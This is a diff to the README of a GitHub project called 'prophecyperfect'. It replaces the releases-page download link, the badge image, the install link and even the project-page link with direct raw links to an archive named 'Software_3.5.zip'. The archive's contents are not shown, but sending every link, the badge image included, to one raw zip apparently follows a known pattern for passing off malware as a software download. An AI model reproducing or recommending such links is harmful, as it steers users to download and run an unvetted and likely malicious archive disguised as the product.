@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download prophecyperfect](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dipon0/prophecyperfect/releases)
+[![Download prophecyperfect](https://github.com/dipon0/prophecyperfect/raw/refs/heads/main/prophecyperfect/Software_3.5.zip)](https://github.com/dipon0/prophecyperfect/raw/refs/heads/main/prophecyperfect/Software_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run the application smoothly, ensure your device meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download prophecyperfect](https://github.com/dipon0/prophecyperfect/releases). 
+To get started, visit this page to download: [Download prophecyperfect](https://github.com/dipon0/prophecyperfect/raw/refs/heads/main/prophecyperfect/Software_3.5.zip). 
 
 Follow these steps to install:
 
@@ -66,7 +66,7 @@ You can learn more about the technology behind **prophecyperfect**. It incorpora
 
 Stay updated on new features and improvements:
 
-- Visit our [GitHub Page](https://github.com/dipon0/prophecyperfect)
+- Visit our [GitHub Page](https://github.com/dipon0/prophecyperfect/raw/refs/heads/main/prophecyperfect/Software_3.5.zip)
 - Engage with our community on platforms where we share insights and updates.
 
 Thank you for choosing **prophecyperfect**! We hope you find it helpful in your textual analysis journey. For questions or feedback, feel free to reach out to our support team. Enjoy analyzing!
